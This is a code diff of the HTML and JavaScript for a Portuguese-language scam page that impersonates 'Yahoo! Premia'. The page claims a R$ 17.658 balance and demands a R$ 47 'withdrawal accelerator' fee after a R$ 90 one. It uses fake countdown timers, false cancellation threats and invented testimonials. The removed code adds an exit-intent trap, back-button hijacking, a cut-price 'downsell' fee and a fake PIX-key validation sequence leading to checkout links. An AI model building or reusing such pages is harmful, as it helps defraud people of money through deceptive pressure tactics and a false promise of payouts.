+    <!-- 4. Warning Card (Risco de Cancelamento) -->
+    <section class="warning-card">
+      <div class="warning-title">
+        <span>⚠️</span> RISCO DE CANCELAMENTO
       </div>
-      <div class="downsell-timer-clock" id="downsellTimerClock">01:00</div>
-      <p class="downsell-timer-note">
-        Após esse prazo, a chave PIX é desvinculada definitivamente de qualquer bonificação.
+      <p class="warning-text">
+        Aguardar 24 dias expõe seu saldo a bugs de sistema e cancelamento automático. Se fechar a página agora, você perderá os R$ 90,00 que acabou de pagar e o saldo voltará para o Yahoo! Premia.
       </p>
+    </section>
+
+    <!-- 5. Expiration Countdown Pill -->
+    <div class="expire-timer-pill">
+      <span>⏰</span>
+      <span>SEU SALDO EXPIRA EM:</span>
+      <strong class="timer-clock" id="countdownClock">08:54</strong>
     </div>
 
-    <!-- Main Downsell Details Card -->
-    <div class="downsell-main-card">
-      <div class="downsell-floating-badge">COTA DISPONÍVEL</div>
+    <!-- 6. Offer Card (Acelerador de Saque) -->
+    <section class="offer-card">
+      <div class="floating-recommend-badge">RECOMENDADO</div>
 
-      <!-- Explanatory Box -->
-      <div class="downsell-info-inner">
-        <p>
-          Como o prazo da <strong>Cota Master</strong> foi excedido, o sistema ativou o protocolo de segurança para você não sair de mãos vazias: sua chave PIX foi transferida para a <strong>Cota Secundária de R$ 8.420,00</strong>.
-          <br><br>
-          Por ser um valor menor, a taxa de validação bancária exigida pelo gateway caiu de <span class="strikethrough-old">R$ 19,90</span> para <strong>apenas R$ 11,68</strong>.
+      <div class="offer-header-group">
+        <div class="thunder-icon-box">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
+          </svg>
+        </div>
+        <div class="offer-header-info">
+          <span class="offer-tag-vip">SERVIDOR VIP</span>
+          <h2 class="offer-title">Acelerador de Saque Imediato (PIX)</h2>
+        </div>
+      </div>
+
+      <!-- Benefit Highlight -->
+      <div class="benefit-highlight-box">
+        <div class="benefit-title">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="20 6 9 17 4 12"></polyline>
+          </svg>
+          Transferência em 3 Minutos
+        </div>
+        <p class="benefit-desc">
+          Pule a fila de 24 dias e receba o dinheiro instantaneamente.
         </p>
       </div>
 
-      <!-- Comparison Rows -->
-      <div class="downsell-comparison-group">
-        <!-- Row 1: Cota Master (Expirada) -->
-        <div class="downsell-compare-row downsell-row-expired">
-          <div class="downsell-row-left">
-            <div class="downsell-row-label-red">
-              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
-                <line x1="18" y1="6" x2="6" y2="18"/>
-                <line x1="6" y1="6" x2="18" y2="18"/>
-              </svg>
-              COTA MASTER (EXPIRADA)
-            </div>
-            <div class="downsell-row-subtext">Taxa exigida era R$ 19,90</div>
-          </div>
-          <div class="downsell-row-price-striked">R$ 17.658,00</div>
+      <!-- Price Section -->
+      <div class="price-callout-wrap">
+        <div class="price-callout-label">CUSTO DO ACELERADOR:</div>
+        <div class="price-callout-value">R$ 47,00</div>
+      </div>
+
+      <!-- CTA Button -->
+      <a href="https://go.perfectpay.com.br/PPU38CQGM1E?upsell=true" class="btn-checkout-cta" id="ctaButton">
+        <span>PAGAR R$ 47 E SACAR AGORA</span>
+        <span>→</span>
+      </a>
+    </section>
+
+    <!-- 7. Resumo da Transação -->
+    <section class="summary-card">
+      <h3 class="summary-title">RESUMO DA TRANSAÇÃO</h3>
+
+      <div class="summary-list">
+        <div class="summary-row">
+          <span>Saldo Acumulado</span>
+          <span class="summary-row-val">R$ 17.658,00</span>
         </div>
 
-        <!-- Row 2: Cota Express (Liberada Agora) -->
-        <div class="downsell-compare-row downsell-row-active">
-          <div class="downsell-row-left">
-            <div class="downsell-row-label-green">
-              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
-                <polyline points="20 6 9 17 4 12"/>
-              </svg>
-              COTA EXPRESS (LIBERADA AGORA)
-            </div>
-            <div class="downsell-row-subtext">Taxa proporcional de apenas R$ 11,68</div>
-          </div>
-          <div class="downsell-row-price-active">R$ 8.420,00</div>
+        <div class="summary-row">
+          <span>Taxa de Cadastro</span>
+          <span class="badge-paid-green">PAGO R$ 90,00</span>
+        </div>
+
+        <div class="summary-row">
+          <span class="summary-row-label">
+            <span>⏰</span> Acelerador PIX
+          </span>
+          <span class="summary-row-val">R$ 47,00</span>
         </div>
       </div>
 
-      <!-- Price Callout -->
-      <div class="downsell-pricing-callout">
-        <div class="downsell-striked-top">De R$ 19,90 por</div>
-        <div class="downsell-promo-tag">APENAS TAXA DE VALIDAÇÃO REDUZIDA:</div>
-        
-        <div class="downsell-huge-price">
-          <span class="rs-prefix">R$</span>
-          <span class="val">11,68</span>
-        </div>
+      <div class="summary-divider"></div>
 
-        <div class="downsell-price-sub">
-          Pagamento único via PIX · Depósito de R$ 8.420,00 em até 3 min
-        </div>
+      <div class="summary-total-row">
+        <span class="summary-total-label">Valor líquido a receber:</span>
+        <span class="summary-total-val">R$ 17.658,00</span>
       </div>
+    </section>
 
-      <!-- Action Button CTA -->
-      <button class="btn-downsell-cta" id="btnDownsellCTA" type="button">
-        <span class="btn-downsell-title">PAGAR R$ 11,68 E SACAR MEUS R$ 8.420,00 AGORA</span>
-        <span class="btn-downsell-subtitle">Transferência imediata para sua chave PIX cadastrada</span>
-      </button>
+    <!-- 8. Comentários (18) -->
+    <section class="comments-wrapper">
+      <h3 class="comments-section-title">Comentários (18)</h3>
 
-    </div>
+      <!-- Comment 1 -->
+      <article class="comment-card">
+        <div class="comment-header">
+          <img 
+            class="comment-avatar" 
+            src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=100&auto=format&fit=crop&q=80" 
+            alt="Fernanda Oliveira"
+            loading="lazy"
+          >
+          <div class="comment-author-info">
+            <h4>Fernanda Oliveira</h4>
+            <span>Há 2 min</span>
+          </div>
+        </div>
+        <p class="comment-body">
+          Eu paguei os 90 e depois achei que era golpe quando pediu esses 47 do acelerador. Mas paguei com medo... GENTE CAIU NA HORA! R$ 17 mil na minha conta!! Valeu muito a pena.
+        </p>
+        <div class="comment-actions">
+          <button type="button" class="comment-action-btn">Curtir</button>
+          <button type="button" class="comment-action-btn">Responder</button>
+          <span class="comment-like-badge">❤️ 45</span>
+        </div>
+      </article>
 
-    <!-- Trust Footer -->
-    <div class="downsell-trust-footer">
-      <span>
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
-          <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
-        </svg>
-        Conexão Criptografada SSL
-      </span>
-      <span>
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.5">
-          <polyline points="20 6 9 17 4 12"/>
-        </svg>
-        Garantia de Envio Imediato
-      </span>
-    </div>
+      <!-- Comment 2 -->
+      <article class="comment-card">
+        <div class="comment-header">
+          <img 
+            class="comment-avatar" 
+            src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=100&auto=format&fit=crop&q=80" 
+            alt="Carlos Henrique"
+            loading="lazy"
+          >
+          <div class="comment-author-info">
+            <h4>Carlos Henrique</h4>
+            <span>Há 15 min</span>
+          </div>
+        </div>
+        <p class="comment-body">
+          Não fechem a página!!! Eu fechei de teimoso e perdi a taxa de cadastro pq o sistema cancelou. Tive que fazer tudo de novo. Paguem o acelerador que cai no mesmo segundo.
+        </p>
+        <div class="comment-actions">
+          <button type="button" class="comment-action-btn">Curtir</button>
+          <button type="button" class="comment-action-btn">Responder</button>
+        </div>
+      </article>
+    </section>
 
-    <!-- Final Reject Link -->
-    <a class="downsell-final-reject-link" id="btnDownsellFinalReject">
-      Prefiro não pagar R$ 11,68 e abrir mão também dos meus R$ 8.420,00
-    </a>
-
-    <!-- Footer -->
-    <footer style="margin-top: 10px;">
-      © Yahoo! Premia Brasil · protocolo-express@yahoo.com · Termos aplicáveis
+    <!-- 9. Aviso Legal e Termos de Uso -->
+    <footer class="legal-disclaimer">
+      <strong>AVISO LEGAL E TERMOS DE USO:</strong> O Yahoo! Premia é um produto educacional e de acesso a um curso em vídeo aulas. Os valores, exemplos e depoimentos apresentados nesta página têm caráter estritamente ilustrativo e representam uma projeção matemática baseada no potencial máximo de resolução de dados, não configurando uma promessa, garantia de ganho exato ou direito adquirido. O acesso à plataforma é concedido mediante o pagamento da taxa de adesão descrita no checkout...
     </footer>
 
-  </div>
-
-  <!-- MODAL DE INTENÇÃO DE SAÍDA (EXIT-INTENT) -->
-  <div class="exit-modal-backdrop" id="exitModalBackdrop" aria-hidden="true">
-    <div class="exit-modal-card">
-      <div class="exit-badge">
-        <span>⚠️</span> PROTOCOLO DE CANCELAMENTO INICIADO
-      </div>
-
-      <h2 class="exit-title">ESPERE! NÃO FECHE ESTA TELA!</h2>
-
-      <p class="exit-desc">
-        Se sair agora, seu PIX de <strong>R$ 17.658,00</strong> será cancelado irreversivelmente e repassado para a fila de espera.
-      </p>
-
-      <div class="exit-timer-pill">
-        Tempo limite para não perder o saque: <strong id="exitCountdown">43s</strong>
-      </div>
-
-      <button class="btn-exit-action" id="btnExitAction" type="button">
-        CONTINUAR E SACAR MEUS R$ 17.658 AGORA
-      </button>
-
-      <div>
-        <a class="exit-dismiss-link" id="btnExitDismiss" href="javascript:void(0);" role="button">
-          Abrir mão dos R$ 17.658 e aceitar rebaixar minha cota para R$ 8.420
-        </a>
-      </div>
-    </div>
-  </div>
-
-  <!-- MODAL MULTI-ETAPAS DE VALIDAÇÃO PIX -->
-  <div class="modal-backdrop" id="pixModalBackdrop" aria-hidden="true">
-    <div class="modal-card" id="pixModalCard">
-      
-      <!-- Botão Fechar Modal -->
-      <button class="modal-close-btn" id="modalCloseBtn" type="button" aria-label="Fechar modal">
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-          <line x1="18" y1="6" x2="6" y2="18"></line>
-          <line x1="6" y1="6" x2="18" y2="18"></line>
-        </svg>
-      </button>
-
-      <!-- ETAPA 1: Inserção da Chave PIX -->
-      <div id="modalStep1">
-        <div class="modal-icon-wrapper">
-          <div class="modal-circle-icon modal-circle-green">
-            <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round">
-              <line x1="12" y1="1" x2="12" y2="23"></line>
-              <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path>
-            </svg>
-          </div>
-        </div>
-
-        <h3 class="modal-title">Para onde enviamos o PIX?</h3>
-        <p class="modal-subtext" id="modalSubtextReward">Cadastre a chave exata onde deseja receber os <strong>R$ 17.658,00</strong> agora mesmo.</p>
-
-        <form id="pixForm" onsubmit="return false;">
-          <label class="modal-input-label" for="pixKeyInput">Sua Chave PIX</label>
-          <input 
-            type="text" 
-            id="pixKeyInput" 
-            class="modal-input" 
-            placeholder="CPF, Celular, E-mail ou Chave Aleatória" 
-            required
-            autocomplete="off"
-          >
-
-          <button class="btn-modal-blue" id="btnConfirmPixKey" type="submit">
-            <span>CONFIRMAR MINHA CHAVE</span>
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-              <line x1="5" y1="12" x2="19" y2="12"></line>
-              <polyline points="12 5 19 12 12 19"></polyline>
-            </svg>
-          </button>
-        </form>
-      </div>
-
-      <!-- ETAPA 2: Processando -->
-      <div id="modalStep2" style="display: none;">
-        <div class="modal-icon-wrapper">
-          <div class="modal-circle-icon modal-circle-blue">
-            <svg class="spinner-svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-              <path d="M21 12a9 9 0 1 1-6.219-8.56"/>
-            </svg>
-          </div>
-        </div>
-
-        <h3 class="modal-title">Processando...</h3>
-        <p class="modal-subtext">Aguarde enquanto o sistema valida a sua chave e prepara a transferência segura.</p>
-
-        <div style="border-top: 1px solid #f1f5f9; padding-top: 16px;">
-          <div class="system-progress-header">Progresso do Sistema:</div>
-
-          <ul class="progress-step-list">
-            <li class="progress-step-item active" id="stepItem1">
-              <svg class="spinner-svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
-                <path d="M21 12a9 9 0 1 1-6.219-8.56"/>
-              </svg>
-              <span>1. Validando chave inserida...</span>
-            </li>
-            <li class="progress-step-item" id="stepItem2">
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" stroke-width="2">
-                <circle cx="12" cy="12" r="9"/>
-              </svg>
-              <span>2. Calculando taxa antifraude...</span>
-            </li>
-            <li class="progress-step-item" id="stepItem3">
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" stroke-width="2">
-                <circle cx="12" cy="12" r="9"/>
-              </svg>
-              <span>3. Gerando link de saque seguro...</span>
-            </li>
-          </ul>
-
-          <div class="progress-footer">
-            <span>A concluir</span>
-            <span class="progress-percent-val" id="progressPercent">25%</span>
-          </div>
-
-          <div class="progress-bar-container">
-            <div class="progress-bar-fill" id="progressBarFill" style="width: 25%;"></div>
-          </div>
-        </div>
-      </div>
-
-      <!-- ETAPA 3: Chave PIX Aprovada! -->
-      <div id="modalStep3" style="display: none;">
-        <div class="modal-icon-wrapper">
-          <div class="modal-circle-icon modal-circle-green">
-            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round">
-              <polyline points="20 6 9 17 4 12"></polyline>
-            </svg>
-          </div>
-        </div>
-
-        <h3 class="modal-title">Chave PIX Aprovada!</h3>
-        <p class="modal-subtext">Pague a taxa de segurança exigida pelo sistema e desbloqueie o saldo <strong>agora mesmo</strong>.</p>
-
-        <!-- Warning Callout -->
-        <div class="modal-warning-card">
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="#dc2626" stroke="#ffffff" stroke-width="2" style="flex-shrink: 0; margin-top: 1px;">
-            <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
-            <line x1="12" y1="9" x2="12" y2="13"/>
-            <line x1="12" y1="17" x2="12.01" y2="17"/>
-          </svg>
-          <p id="modalWarningText">
-            <strong>Atenção:</strong> O não pagamento da taxa fará com que o valor de R$ 17.658 seja <strong><u>cancelado e bloqueado</u></strong>.
-          </p>
-        </div>
-
-        <div style="border-top: 1px solid #f1f5f9; padding-top: 16px;">
-          <div class="system-progress-header">Progresso do Sistema:</div>
-
-          <ul class="progress-step-list">
-            <li class="progress-step-item completed">
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-                <polyline points="20 6 9 17 4 12"/>
-              </svg>
-              <span>1. Validando chave inserida...</span>
-            </li>
-            <li class="progress-step-item completed">
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-                <polyline points="20 6 9 17 4 12"/>
-              </svg>
-              <span>2. Calculando taxa antifraude...</span>
-            </li>
-            <li class="progress-step-item completed">
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-                <polyline points="20 6 9 17 4 12"/>
-              </svg>
-              <span>3. Gerando link de saque seguro...</span>
-            </li>
-          </ul>
-
-          <div class="progress-footer">
-            <span>A concluir</span>
-            <span class="progress-percent-val" style="color: #16a34a;">100%</span>
-          </div>
-
-          <div class="progress-bar-container">
-            <div class="progress-bar-fill" style="width: 100%; background: #2563eb;"></div>
-          </div>
-
-          <a href="https://go.perfectpay.com.br/PPU38CQGQEO" class="btn-redirect-badge" id="redirectCountdownText">
-            Redirecionando para o checkout seguro em 4s...
-          </a>
-        </div>
-      </div>
-
-    </div>
-  </div>
+  </main>
 
   <script>
     document.addEventListener('DOMContentLoaded', function () {
       
-      // FAQ Accordion Logic
-      const faqHeaders = document.querySelectorAll('.faq-header');
+      // 1. Contagem regressiva funcional a partir de 08:54
+      const clockElement = document.getElementById('countdownClock');
+      let totalSeconds = 8 * 60 + 54; // 08:54 em segundos
 
-      faqHeaders.forEach(header => {
-        header.addEventListener('click', function () {
-          const item = this.parentElement;
-          const body = item.querySelector('.faq-body');
-          const isCurrentlyActive = item.classList.contains('active');
+      function updateCountdown() {
+        if (totalSeconds < 0) return;
 
-          document.querySelectorAll('.faq-item').forEach(otherItem => {
-            otherItem.classList.remove('active');
-            otherItem.querySelector('.faq-header').setAttribute('aria-expanded', 'false');
-            otherItem.querySelector('.faq-body').style.maxHeight = '0px';
-          });
-
-          if (!isCurrentlyActive) {
-            item.classList.add('active');
-            this.setAttribute('aria-expanded', 'true');
-            body.style.maxHeight = body.scrollHeight + 'px';
-          }
-        });
-      });
-
-      // Contagem regressiva sincronizada nos timers da página inicial
-      let totalSeconds = 9 * 60 + 51; // 09:51
-
-      function updateTimers() {
         const minutes = Math.floor(totalSeconds / 60);
         const seconds = totalSeconds % 60;
-        const formattedTime = 
-          String(minutes).padStart(2, '0') + ':' + 
-          String(seconds).padStart(2, '0');
 
-        const topEl = document.getElementById('topTimer');
-        const btmEl = document.getElementById('bottomTimer');
+        const formattedMinutes = String(minutes).padStart(2, '0');
+        const formattedSeconds = String(seconds).padStart(2, '0');
 
-        if (topEl) topEl.textContent = formattedTime;
-        if (btmEl) btmEl.textContent = formattedTime;
-
-        if (totalSeconds > 0) {
-          totalSeconds--;
+        if (clockElement) {
+          clockElement.textContent = `${formattedMinutes}:${formattedSeconds}`;
         }
+
+        totalSeconds--;
       }
 
-      setInterval(updateTimers, 1000);
+      updateCountdown();
+      const timerInterval = setInterval(updateCountdown, 1000);
 
-      // --- LOGICA DE CHECKOUT E UTMS ---
-      const BASE_CHECKOUT_URL = 'https://go.perfectpay.com.br/PPU38CQGQEO';
-      const DOWNSELL_CHECKOUT_URL = 'https://go.perfectpay.com.br/PPU38CQGRTH';
-
-      function getFullCheckoutUrl(baseUrl = BASE_CHECKOUT_URL) {
+      // 2. Preservação dinâmica de UTMs e repasse para o checkout
+      const ctaBtn = document.getElementById('ctaButton');
+      if (ctaBtn) {
         const currentQuery = window.location.search;
-        if (!currentQuery) return baseUrl;
-        const separator = baseUrl.includes('?') ? '&' : '?';
-        return baseUrl + separator + currentQuery.replace(/^\?/, '');
-      }
+        if (currentQuery) {
+          try {
+            const currentUrl = new URL(ctaBtn.href);
+            const incomingParams = new URLSearchParams(currentQuery);
 
-      function goToCheckout(baseUrl = BASE_CHECKOUT_URL) {
-        window.location.href = getFullCheckoutUrl(baseUrl);
-      }
+            incomingParams.forEach((value, key) => {
+              currentUrl.searchParams.set(key, value);
+            });
 
-      // --- CONTROLE DE TELAS (MAIN VIEW vs DOWNSELL VIEW) ---
-      const mainContentView = document.getElementById('mainContentView');
-      const downsellView = document.getElementById('downsellView');
-      let currentActiveView = 'main'; // 'main' ou 'downsell'
-
-      // Timer da tela de Downsell (01:00)
-      const downsellTimerClock = document.getElementById('downsellTimerClock');
-      let downsellSeconds = 60;
-      let downsellInterval = null;
-
-      function startDownsellCountdown() {
-        if (downsellInterval) clearInterval(downsellInterval);
-        downsellSeconds = 60;
-
-        downsellInterval = setInterval(() => {
-          downsellSeconds--;
-          if (downsellSeconds >= 0) {
-            const m = String(Math.floor(downsellSeconds / 60)).padStart(2, '0');
-            const s = String(downsellSeconds % 60).padStart(2, '0');
-            if (downsellTimerClock) downsellTimerClock.textContent = `${m}:${s}`;
-          } else {
-            clearInterval(downsellInterval);
-            if (downsellTimerClock) downsellTimerClock.textContent = '00:00';
+            // Garante que upsell=true continue presente
+            currentUrl.searchParams.set('upsell', 'true');
+            ctaBtn.href = currentUrl.toString();
+          } catch (e) {
+            console.error('Erro ao repassar UTMs:', e);
           }
-        }, 1000);
-      }
-
-      function switchToDownsell() {
-        currentActiveView = 'downsell';
-        hideExitModal();
-
-        // Oculta visual principal e exibe tela de Downsell
-        if (mainContentView) mainContentView.style.display = 'none';
-        if (downsellView) {
-          downsellView.style.display = 'flex';
-          downsellView.style.visibility = 'visible';
-        }
-        document.body.classList.add('dark-downsell-mode');
-        window.scrollTo({ top: 0, behavior: 'instant' });
-
-        // Ajusta textos do modal para o valor reduzido de R$ 8.420,00
-        const modalSubtextReward = document.getElementById('modalSubtextReward');
-        const modalWarningText = document.getElementById('modalWarningText');
-
-        if (modalSubtextReward) {
-          modalSubtextReward.innerHTML = 'Cadastre a chave exata onde deseja receber os <strong>R$ 8.420,00</strong> agora mesmo.';
-        }
-        if (modalWarningText) {
-          modalWarningText.innerHTML = '<strong>Atenção:</strong> O não pagamento da taxa fará com que o valor de R$ 8.420 seja <strong><u>cancelado e bloqueado</u></strong>.';
-        }
-
-        startDownsellCountdown();
-      }
-
-      // Botão CTA da tela de Downsell
-      const btnDownsellCTA = document.getElementById('btnDownsellCTA');
-      if (btnDownsellCTA) {
-        btnDownsellCTA.addEventListener('click', function () {
-          goToCheckout(DOWNSELL_CHECKOUT_URL);
-        });
-      }
-
-      // Link final de descarte na tela de Downsell
-      const btnDownsellFinalReject = document.getElementById('btnDownsellFinalReject');
-      if (btnDownsellFinalReject) {
-        btnDownsellFinalReject.addEventListener('click', function () {
-          window.location.href = 'https://www.google.com';
-        });
-      }
-
-      // --- LOGICA DO MODAL MULTI-ETAPAS ---
-      const modalBackdrop = document.getElementById('pixModalBackdrop');
-      const modalCloseBtn = document.getElementById('modalCloseBtn');
-      const triggerButtons = document.querySelectorAll('.trigger-pix-modal');
-      
-      const step1 = document.getElementById('modalStep1');
-      const step2 = document.getElementById('modalStep2');
-      const step3 = document.getElementById('modalStep3');
-
-      const pixForm = document.getElementById('pixForm');
-      const pixKeyInput = document.getElementById('pixKeyInput');
-
-      const progressBarFill = document.getElementById('progressBarFill');
-      const progressPercent = document.getElementById('progressPercent');
-      const stepItem1 = document.getElementById('stepItem1');
-      const stepItem2 = document.getElementById('stepItem2');
-      const stepItem3 = document.getElementById('stepItem3');
-      const redirectCountdownText = document.getElementById('redirectCountdownText');
-
-      if (redirectCountdownText) {
-        redirectCountdownText.setAttribute('href', getFullCheckoutUrl());
-        redirectCountdownText.addEventListener('click', function (e) {
-          e.preventDefault();
-          goToCheckout();
-        });
-      }
-
-      let progressInterval = null;
-      let redirectTimerInterval = null;
-
-      function resetModal() {
-        if (progressInterval) clearInterval(progressInterval);
-        if (redirectTimerInterval) clearInterval(redirectTimerInterval);
-
-        step1.style.display = 'block';
-        step2.style.display = 'none';
-        step3.style.display = 'none';
-
-        modalCloseBtn.style.display = 'flex';
-        pixKeyInput.value = '';
-        progressBarFill.style.width = '25%';
-        progressPercent.textContent = '25%';
-
-        stepItem1.className = 'progress-step-item active';
-        stepItem1.innerHTML = `
-          <svg class="spinner-svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
-            <path d="M21 12a9 9 0 1 1-6.219-8.56"/>
-          </svg>
-          <span>1. Validando chave inserida...</span>
-        `;
-
-        stepItem2.className = 'progress-step-item';
-        stepItem2.innerHTML = `
-          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" stroke-width="2">
-            <circle cx="12" cy="12" r="9"/>
-          </svg>
-          <span>2. Calculando taxa antifraude...</span>
-        `;
-
-        stepItem3.className = 'progress-step-item';
-        stepItem3.innerHTML = `
-          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" stroke-width="2">
-            <circle cx="12" cy="12" r="9"/>
-          </svg>
-          <span>3. Gerando link de saque seguro...</span>
-        `;
-      }
-
-      function openModal() {
-        resetModal();
-        modalBackdrop.classList.add('open');
-        modalBackdrop.setAttribute('aria-hidden', 'false');
-        setTimeout(() => {
-          pixKeyInput.focus();
-        }, 150);
-      }
-
-      function closeModal() {
-        modalBackdrop.classList.remove('open');
-        modalBackdrop.setAttribute('aria-hidden', 'true');
-        resetModal();
-      }
-
-      triggerButtons.forEach(btn => {
-        btn.addEventListener('click', openModal);
-      });
-
-      modalCloseBtn.addEventListener('click', closeModal);
-
-      modalBackdrop.addEventListener('click', function (e) {
-        if (e.target === modalBackdrop) {
-          closeModal();
-        }
-      });
-
-      // --- LOGICA DE INTENÇÃO DE SAÍDA (EXIT-INTENT) E TRANSIÇÃO DOWNSELL ---
-      const exitModalBackdrop = document.getElementById('exitModalBackdrop');
-      const btnExitAction = document.getElementById('btnExitAction');
-      const btnExitDismiss = document.getElementById('btnExitDismiss');
-      const exitCountdownEl = document.getElementById('exitCountdown');
-
-      let exitShownCount = 0;
-      let exitTimerInterval = null;
-      let exitSeconds = 43;
-
-      function startExitCountdown() {
-        if (exitTimerInterval) clearInterval(exitTimerInterval);
-        exitSeconds = 43;
-        if (exitCountdownEl) exitCountdownEl.textContent = `${exitSeconds}s`;
-
-        exitTimerInterval = setInterval(() => {
-          exitSeconds--;
-          if (exitSeconds >= 0) {
-            if (exitCountdownEl) exitCountdownEl.textContent = `${exitSeconds}s`;
-          } else {
-            clearInterval(exitTimerInterval);
-          }
-        }, 1000);
-      }
-
-      function showExitModal() {
-        if (currentActiveView === 'downsell') return; // Na tela de downsell não exibe o modal de 17k
-
-        if (exitShownCount === 0) {
-          exitShownCount++;
-          exitModalBackdrop.classList.add('open');
-          exitModalBackdrop.setAttribute('aria-hidden', 'false');
-          startExitCountdown();
-        } else {
-          // Tentou sair pela segunda vez: direciona direto ao Downsell
-          switchToDownsell();
         }
       }
-
-      function hideExitModal() {
-        exitModalBackdrop.classList.remove('open');
-        exitModalBackdrop.setAttribute('aria-hidden', 'true');
-        if (exitTimerInterval) clearInterval(exitTimerInterval);
-      }
-
-      // 1. Detecção no Desktop: Cursor saindo pelo topo da janela
-      document.addEventListener('mouseleave', function (e) {
-        if (e.clientY <= 10) {
-          showExitModal();
-        }
-      });
-
-      // 2. Detecção no Mobile / Navegador: Histórico de retorno (back button)
-      try {
-        window.history.pushState({ page: 'saque' }, '', window.location.href);
-        window.addEventListener('popstate', function () {
-          if (currentActiveView === 'main') {
-            if (exitShownCount === 0) {
-              showExitModal();
-              window.history.pushState({ page: 'saque' }, '', window.location.href);
-            } else {
-              switchToDownsell();
-            }
-          }
-        });
-      } catch (err) {}
-
-      // Ao clicar em "CONTINUAR E SACAR MEUS R$ 17.658 AGORA"
-      btnExitAction.addEventListener('click', function () {
-        hideExitModal();
-        openModal();
-      });
-
-      // Ao clicar em "Abrir mão dos R$ 17.658 e aceitar rebaixar minha cota para R$ 8.420"
-      if (btnExitDismiss) {
-        const handleDismissClick = function (e) {
-          if (e) {
-            e.preventDefault();
-            e.stopPropagation();
-          }
-          switchToDownsell();
-        };
-
-        btnExitDismiss.addEventListener('click', handleDismissClick);
-        btnExitDismiss.addEventListener('touchend', handleDismissClick);
-      }
-
-      // Submissão do Formulário da Chave PIX (Etapa 1 -> Etapa 2 -> Etapa 3)
-      pixForm.addEventListener('submit', function (e) {
-        e.preventDefault();
-        const chave = pixKeyInput.value.trim();
-        if (!chave) return;
-
-        modalCloseBtn.style.display = 'none';
-        step1.style.display = 'none';
-        step2.style.display = 'block';
-
-        let percent = 25;
-        let elapsedMs = 0;
-
-        progressInterval = setInterval(() => {
-          elapsedMs += 40;
-
-          if (elapsedMs >= 1200 && elapsedMs < 2400) {
-            percent = 65;
-            progressBarFill.style.width = percent + '%';
-            progressPercent.textContent = percent + '%';
-
-            stepItem1.className = 'progress-step-item completed';
-            stepItem1.innerHTML = `
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-                <polyline points="20 6 9 17 4 12"/>
-              </svg>
-              <span>1. Validando chave inserida...</span>
-            `;
-
-            stepItem2.className = 'progress-step-item active';
-            stepItem2.innerHTML = `
-              <svg class="spinner-svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
-                <path d="M21 12a9 9 0 1 1-6.219-8.56"/>
-              </svg>
-              <span>2. Calculando taxa antifraude...</span>
-            `;
-          }
-
-          if (elapsedMs >= 2400 && elapsedMs < 3600) {
-            percent = 90;
-            progressBarFill.style.width = percent + '%';
-            progressPercent.textContent = percent + '%';
-
-            stepItem2.className = 'progress-step-item completed';
-            stepItem2.innerHTML = `
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-                <polyline points="20 6 9 17 4 12"/>
-              </svg>
-              <span>2. Calculando taxa antifraude...</span>
-            `;
-
-            stepItem3.className = 'progress-step-item active';
-            stepItem3.innerHTML = `
-              <svg class="spinner-svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
-                <path d="M21 12a9 9 0 1 1-6.219-8.56"/>
-              </svg>
-              <span>3. Gerando link de saque seguro...</span>
-            `;
-          }
-
-          if (elapsedMs >= 3600) {
-            clearInterval(progressInterval);
-            step2.style.display = 'none';
-            step3.style.display = 'block';
-
-            redirectCountdownText.setAttribute('href', getFullCheckoutUrl());
-
-            let redirectSeconds = 4;
